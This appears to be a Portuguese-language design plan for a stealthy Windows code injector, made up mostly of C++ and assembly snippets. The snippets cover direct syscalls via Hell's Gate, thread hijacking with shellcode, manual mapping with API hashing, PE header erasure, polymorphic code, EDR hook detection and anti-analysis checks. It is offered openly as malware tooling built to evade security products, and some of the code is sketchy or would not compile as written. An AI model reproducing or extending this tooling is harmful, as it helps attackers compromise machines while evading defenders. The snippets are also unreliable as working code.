# Roteiro Avançado: Injetor com Thread Hijacking + Manual Mapping + Evasão Avançada

## 🎯 MELHORIAS IMPLEMENTADAS

### 🔍 **Técnicas Avançadas de Evasion**

#### 1.1 **Syscall Obfuscation com Hell's Gate**
```cpp
class AdvancedSyscallInvoker {
private:
    struct SYSCALL_ENTRY {
        uint32_t hash;
        uint16_t syscall_id;
        bool is_hooked;
    };
    
    // Dynamically extract syscall numbers from ntdll
    uint16_t ExtractSyscallNumber(const char* func_name) {
        HMODULE ntdll = GetModuleHandleA(obfuscated_strings::ntdll());
        FARPROC func_addr = GetProcAddress(ntdll, func_name);
        
        // Hell's Gate technique - scan for syscall instruction
        BYTE* bytes = (BYTE*)func_addr;
        for (int i = 0; i < 32; i++) {
            if (bytes[i] == 0x0F && bytes[i+1] == 0x05) {
                return *(uint16_t*)(bytes + i - 4);
            }
        }
        return 0;
    }
    
public:
    uint64_t InvokeSyscall(const char* func_name, ...) {
        uint16_t syscall_id = ExtractSyscallNumber(func_name);
        __asm {
            mov r10, rcx
            mov eax, syscall_id
            syscall
            ret
        }
    }
};
```

#### 1.2 **Memory Permission Cycling**
```cpp
void MemoryPermissionStealth(HANDLE hProcess, void* address, size_t size) {
    // Cycle permissions to avoid detection
    syscall.NtProtectVirtualMemory(hProcess, &address, &size, 
                                  PAGE_READWRITE, &old_protect);  // Write phase
    
    // Copy payload...
    
    syscall.NtProtectVirtualMemory(hProcess, &address, &size, 
                                  PAGE_EXECUTE_READ, &old_protect); // Execute phase
}
```

### 🛡️ **Bypass de ASLR Avançado**

#### 2.1 **Memory Disclosure Attack**
```cpp
class ASLRBypass {
public:
    uintptr_t LeakModuleBase(DWORD pid, const char* module_name) {
        // Use NtQueryInformationProcess to leak PEB
        PROCESS_BASIC_INFORMATION pbi;
        syscall.NtQueryInformationProcess(hProcess, ProcessBasicInformation, 
                                         &pbi, sizeof(pbi), nullptr);
        
        // Read PEB from remote process
        PEB remote_peb;
        ReadProcessMemory(hProcess, pbi.PebBaseAddress, 
                         &remote_peb, sizeof(remote_peb), nullptr);
        
        return FindModuleInPEB(remote_peb, module_name);
    }
    
private:
    uintptr_t FindModuleInPEB(PEB peb, const char* target_module) {
        // Iterate through loaded modules to find base address
        for (auto module : peb.Ldr->InMemoryOrderModuleList) {
            char module_name[MAX_PATH];
            ReadProcessMemory(hProcess, module.BaseDllName.Buffer,
                            module_name, module.BaseDllName.Length, nullptr);
            
            if (strcmp(module_name, target_module) == 0) {
                return (uintptr_t)module.DllBase;
            }
        }
        return 0;
    }
};
```

#### 2.2 **Heap Spraying Alternativo**
```cpp
void AdvancedHeapSpray(HANDLE hProcess, void* shellcode, size_t shellcode_size) {
    // Spray with XOR encoded payloads
    std::vector<BYTE> encoded_shellcode = XOREncode(shellcode, shellcode_size, 0xAA);
    
    for (int i = 0; i < 100; i++) {
        void* spray_addr = (void*)(0x0A0A0A0A0A0A0000 + (i * 0x10000));
        SIZE_T region_size = 0x10000;
        
        syscall.NtAllocateVirtualMemory(hProcess, &spray_addr, 0, &region_size,
                                      MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        
        // Write encoded shellcode at specific offset
        void* target_addr = (void*)((uintptr_t)spray_addr + 0x1234);
        WriteProcessMemory(hProcess, target_addr, 
                         encoded_shellcode.data(), shellcode_size, nullptr);
    }
}
```

### 🔄 **Thread Hijacking Aprimorado**

#### 3.1 **Thread State Analysis Avançado**
```cpp
struct THREAD_ANALYSIS {
    DWORD thread_id;
    THREAD_STATE state;
    uintptr_t stack_base;
    uintptr_t stack_limit;
    CONTEXT thread_context;
    bool is_suitable;
};

std::vector<THREAD_ANALYSIS> AnalyzeProcessThreads(DWORD pid) {
    std::vector<THREAD_ANALYSIS> results;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid);
    THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
    
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                THREAD_ANALYSIS analysis = {0};
                analysis.thread_id = te32.th32ThreadID;
                
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                
                // Advanced thread state analysis
                analysis.state = GetThreadWaitState(hThread);
                analysis.is_suitable = IsThreadHijackable(analysis);
                
                results.push_back(analysis);
                CloseHandle(hThread);
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    
    CloseHandle(hSnapshot);
    return results;
}

bool IsThreadHijackable(const THREAD_ANALYSIS& analysis) {
    return (analysis.state == WAITING && 
           !IsThreadCritical(analysis.thread_id) &&
           HasSufficientStackSpace(analysis));
}
```

#### 3.2 **Shellcode com Context Preservation**
```assembly
; Advanced shellcode with full context preservation
hijack_shellcode:
    ; Save ALL registers and flags
    pushfq
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15
    
    ; Save original stack pointer
    mov [original_rsp], rsp
    
    ; Align stack to 16-byte boundary
    and rsp, 0xFFFFFFFFFFFFFFF0
    
    ; Execute payload
    call reflective_loader
    
    ; Restore original stack
    mov rsp, [original_rsp]
    
    ; Restore ALL registers and flags
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    popfq
    
    ; Return to original execution
    ret

original_rsp:
    dq 0
```

### 🧩 **Manual Mapping com Proteção Anti-Análise**

#### 4.1 **Import Resolution com API Hashing**
```cpp
uintptr_t ResolveAPIByHash(uintptr_t module_base, uint32_t api_hash) {
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)module_base;
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)(module_base + dos_header->e_lfanew);
    
    IMAGE_EXPORT_DIRECTORY* export_dir = (IMAGE_EXPORT_DIRECTORY*)(
        module_base + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD* functions = (DWORD*)(module_base + export_dir->AddressOfFunctions);
    DWORD* names = (DWORD*)(module_base + export_dir->AddressOfNames);
    WORD* ordinals = (WORD*)(module_base + export_dir->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        char* function_name = (char*)(module_base + names[i]);
        uint32_t hash = CalculateFunctionHash(function_name);
        
        if (hash == api_hash) {
            return module_base + functions[ordinals[i]];
        }
    }
    return 0;
}

uint32_t CalculateFunctionHash(const char* function_name) {
    uint32_t hash = 0;
    while (*function_name) {
        hash = (hash << 13) | (hash >> 19);
        hash += *function_name++;
        hash ^= 0xDEADBEEF; // Salt for uniqueness
    }
    return hash;
}
```

#### 4.2 **PE Header Erasure**
```cpp
void ErasePEHeaders(void* module_base) {
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)module_base;
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)(module_base + dos_header->e_lfanew);
    
    // Erase DOS header signature
    dos_header->e_magic = 0;
    
    // Erase PE signature
    nt_headers->Signature = 0;
    
    // Zero out critical headers
    SIZE_T header_size = nt_headers->OptionalHeader.SizeOfHeaders;
    DWORD old_protect;
    
    syscall.NtProtectVirtualMemory(GetCurrentProcess(), &module_base, 
                                  &header_size, PAGE_READWRITE, &old_protect);
    
    SecureZeroMemory(module_base, header_size);
    
    syscall.NtProtectVirtualMemory(GetCurrentProcess(), &module_base, 
                                  &header_size, PAGE_NOACCESS, &old_protect);
}
```

### 🎭 **Técnicas de Ofuscação Avançada**

#### 5.1 **Polymorphic Code Generation**
```cpp
class PolymorphicEngine {
private:
    std::vector<BYTE> original_code;
    std::map<uint32_t, std::vector<BYTE>> code_variants;
    
public:
    std::vector<BYTE> GenerateVariant(const std::vector<BYTE>& code) {
        std::vector<BYTE> variant = code;
        
        // Apply random transformations
        switch (rand() % 6) {
            case 0: InsertNops(variant); break;
            case 1: RegisterRenaming(variant); break;
            case 2: InstructionReordering(variant); break;
            case 3: JunkInsertion(variant); break;
            case 4: EquivalentSubstitution(variant); break;
            case 5: EncryptionLayer(variant); break;
        }
        
        return variant;
    }
    
    void InsertNops(std::vector<BYTE>& code) {
        // Insert random NOP-equivalent instructions
        std::vector<BYTE> nop_equivalents[] = {
            {0x90}, // NOP
            {0x66, 0x90}, // NOP with operand size override
            {0x0F, 0x1F, 0x00}, // Multi-byte NOP
            {0x48, 0x87, 0xC0}  // XCHG RAX, RAX
        };
        
        size_t insert_pos = rand() % (code.size() - 1);
        auto nop = nop_equivalents[rand() % 4];
        code.insert(code.begin() + insert_pos, nop.begin(), nop.end());
    }
};
```

### 📊 **Sistema de Monitoramento e Adaptação**

#### 6.1 **EDR Detection Heuristics**
```cpp
class EDRDetector {
public:
    bool IsEDRPresent() {
        return (DetectUserModeHooks() || 
                DetectKernelCallbacks() || 
                DetectSuspiciousProcesses());
    }
    
private:
    bool DetectUserModeHooks() {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        
        // Check for inline hooks in syscall functions
        const char* critical_apis[] = {"NtCreateThreadEx", "NtAllocateVirtualMemory", 
                                      "NtProtectVirtualMemory", "NtOpenProcess"};
        
        for (auto api : critical_apis) {
            FARPROC func = GetProcAddress(ntdll, api);
            if (IsFunctionHooked(func)) {
                return true;
            }
        }
        return false;
    }
    
    bool IsFunctionHooked(void* function) {
        BYTE* bytes = (BYTE*)function;
        
        // Check for JMP instructions (common hooking technique)
        if (bytes[0] == 0xE9 || bytes[0] == 0xFF || bytes[0] == 0x68) {
            return true;
        }
        
        return false;
    }
};
```

### 🚀 **Fluxo de Execução Otimizado**

```
PHASE 1: RECONNAISSANCE
├── [1.1] Process Enumeration & Analysis
├── [1.2] EDR Detection & Bypass Planning
├── [1.3] ASLR Bypass via Memory Disclosure
└── [1.4] Thread Analysis & Selection

PHASE 2: STEALTH INFILTRATION  
├── [2.1] Dynamic Syscall Extraction (Hell's Gate)
├── [2.2] Memory Allocation with Permission Cycling
├── [2.3] Polymorphic Shellcode Generation
└── [2.4] Encrypted Payload Transmission

PHASE 3: PRECISION INJECTION
├── [3.1] Thread Suspension & Context Preservation
├── [3.2] Manual Mapping with API Hashing
├── [3.3] Import Resolution & Relocation Fixing
└── [3.4] PE Header Erasure & Memory Obfuscation

PHASE 4: CLEAN EXECUTION
├── [4.1] Thread Context Restoration
├── [4.2] Memory Artifact Cleanup
├── [4.3] Handle Closure & Log Sanitization
└── [4.4] Continuous Monitoring & Adaptation
```

### 🛠️ **Ferramentas de Desenvolvimento**

```cpp
// Debugging and logging macros (removed in production)
#ifdef _DEBUG
#define STEALTH_LOG(msg, ...) \
    DeleteFileAfterRead("C:\\temp\\injector.log"); \
    WriteEncryptedLog(msg, __VA_ARGS__)
#else
#define STEALTH_LOG(msg, ...) 
#endif

// Anti-analysis checks
void AntiAnalysisRoutines() {
    if (IsBeingDebugged() || IsVMEnvironment() || HasAnalysisTools()) {
        ExecuteDecoyBehavior();
        return;
    }
}
```

Este roteiro avançado incorpora técnicas state-of-the-art para evasão, incluindo bypass de ASLR via memory disclosure, syscall dinâmico com Hell's Gate, ofuscação polimórfica, e detecção proativa de EDRs. A arquitetura modular permite adaptação em tempo real às defesas do ambiente.